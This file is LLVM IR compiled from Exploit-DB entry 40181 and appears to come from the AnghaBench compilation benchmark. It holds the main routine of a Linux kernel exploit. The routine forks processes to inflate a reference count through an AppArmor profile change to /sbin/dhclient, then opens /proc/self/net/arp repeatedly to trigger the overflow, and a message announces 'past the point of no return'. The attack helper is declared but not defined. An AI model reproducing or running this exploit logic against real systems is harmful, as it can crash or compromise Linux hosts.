; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/dos/extr_40181.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/dos/extr_40181.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@HASH_PATH = common dso_local global i8* null, align 8
@O_RDONLY = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [25 x i8] c"failed to open HASH_PATH\00", align 1
@stderr = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [60 x i8] c"[*] forking to speed up initial reference count increments\0A\00", align 1
@.str.2 = private unnamed_addr constant [47 x i8] c"[*] initial reference count increase finished\0A\00", align 1
@.str.3 = private unnamed_addr constant [22 x i8] c"[*] entering profile\0A\00", align 1
@.str.4 = private unnamed_addr constant [15 x i8] c"/sbin/dhclient\00", align 1
@.str.5 = private unnamed_addr constant [19 x i8] c"/proc/self/net/arp\00", align 1
@.str.6 = private unnamed_addr constant [32 x i8] c"[*] past the point of no return\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca [256 x i32], align 16
  %8 = alloca i64, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %14 = load i8*, i8** @HASH_PATH, align 8
  %15 = load i32, i32* @O_RDONLY, align 4
  %16 = call i32 @open(i8* %14, i32 %15)
  store i32 %16, i32* %6, align 4
  %17 = load i32, i32* %6, align 4
  %18 = icmp slt i32 %17, 0
  br i1 %18, label %19, label %21

19:                                               ; preds = %2
  %20 = call i32 @err(i32 -1, i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str, i64 0, i64 0))
  br label %21

21:                                               ; preds = %19, %2
  %22 = load i32, i32* @stderr, align 4
  %23 = call i32 @fprintf(i32 %22, i8* getelementptr inbounds ([60 x i8], [60 x i8]* @.str.1, i64 0, i64 0))
  store i32 0, i32* %9, align 4
  br label %24

24:                                               ; preds = %35, %21
  %25 = load i32, i32* %9, align 4
  %26 = icmp slt i32 %25, 15
  br i1 %26, label %27, label %38

27:                                               ; preds = %24
  %28 = call i64 (...) @fork()
  %29 = icmp ne i64 %28, 0
  br i1 %29, label %34, label %30

30:                                               ; preds = %27
  %31 = load i32, i32* %6, align 4
  %32 = call i32 @add_references(i32 %31, i32 286331136)
  %33 = call i32 @exit(i32 0) #3
  unreachable

34:                                               ; preds = %27
  br label %35

35:                                               ; preds = %34
  %36 = load i32, i32* %9, align 4
  %37 = add nsw i32 %36, 1
  store i32 %37, i32* %9, align 4
  br label %24

38:                                               ; preds = %24
  store i32 0, i32* %10, align 4
  br label %39

39:                                               ; preds = %44, %38
  %40 = load i32, i32* %10, align 4
  %41 = icmp slt i32 %40, 15
  br i1 %41, label %42, label %47

42:                                               ; preds = %39
  %43 = call i32 @wait(i32* %11)
  br label %44

44:                                               ; preds = %42
  %45 = load i32, i32* %10, align 4
  %46 = add nsw i32 %45, 1
  store i32 %46, i32* %10, align 4
  br label %39

47:                                               ; preds = %39
  %48 = load i32, i32* @stderr, align 4
  %49 = call i32 @fprintf(i32 %48, i8* getelementptr inbounds ([47 x i8], [47 x i8]* @.str.2, i64 0, i64 0))
  %50 = load i32, i32* @stderr, align 4
  %51 = call i32 @fprintf(i32 %50, i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.3, i64 0, i64 0))
  %52 = call i32 @aa_change_profile(i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.4, i64 0, i64 0))
  %53 = call i64 (...) @fork()
  store i64 %53, i64* %8, align 8
  %54 = load i64, i64* %8, align 8
  %55 = icmp ne i64 %54, 0
  br i1 %55, label %56, label %70

56:                                               ; preds = %47
  store i32 0, i32* %12, align 4
  br label %57

57:                                               ; preds = %66, %56
  %58 = load i32, i32* %12, align 4
  %59 = icmp slt i32 %58, 256
  br i1 %59, label %60, label %69

60:                                               ; preds = %57
  %61 = load i32, i32* @O_RDONLY, align 4
  %62 = call i32 @open(i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.5, i64 0, i64 0), i32 %61)
  %63 = load i32, i32* %12, align 4
  %64 = sext i32 %63 to i64
  %65 = getelementptr inbounds [256 x i32], [256 x i32]* %7, i64 0, i64 %64
  store i32 %62, i32* %65, align 4
  br label %66

66:                                               ; preds = %60
  %67 = load i32, i32* %12, align 4
  %68 = add nsw i32 %67, 1
  store i32 %68, i32* %12, align 4
  br label %57

69:                                               ; preds = %57
  br label %74

70:                                               ; preds = %47
  %71 = load i32, i32* %6, align 4
  %72 = call i32 @add_references(i32 %71, i32 256)
  %73 = call i32 @exit(i32 0) #3
  unreachable

74:                                               ; preds = %69
  %75 = load i32, i32* @stderr, align 4
  %76 = call i32 @fprintf(i32 %75, i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.6, i64 0, i64 0))
  %77 = call i32 @sleep(i32 5)
  store i32 0, i32* %13, align 4
  br label %78

78:                                               ; preds = %87, %74
  %79 = load i32, i32* %13, align 4
  %80 = icmp slt i32 %79, 256
  br i1 %80, label %81, label %90

81:                                               ; preds = %78
  %82 = load i32, i32* %13, align 4
  %83 = sext i32 %82 to i64
  %84 = getelementptr inbounds [256 x i32], [256 x i32]* %7, i64 0, i64 %83
  %85 = load i32, i32* %84, align 4
  %86 = call i32 @close(i32 %85)
  br label %87

87:                                               ; preds = %81
  %88 = load i32, i32* %13, align 4
  %89 = add nsw i32 %88, 1
  store i32 %89, i32* %13, align 4
  br label %78

90:                                               ; preds = %78
  %91 = load i32, i32* %3, align 4
  ret i32 %91
}

declare dso_local i32 @open(i8*, i32) #1

declare dso_local i32 @err(i32, i8*) #1

declare dso_local i32 @fprintf(i32, i8*) #1

declare dso_local i64 @fork(...) #1

declare dso_local i32 @add_references(i32, i32) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @wait(i32*) #1

declare dso_local i32 @aa_change_profile(i8*) #1

declare dso_local i32 @sleep(i32) #1

declare dso_local i32 @close(i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
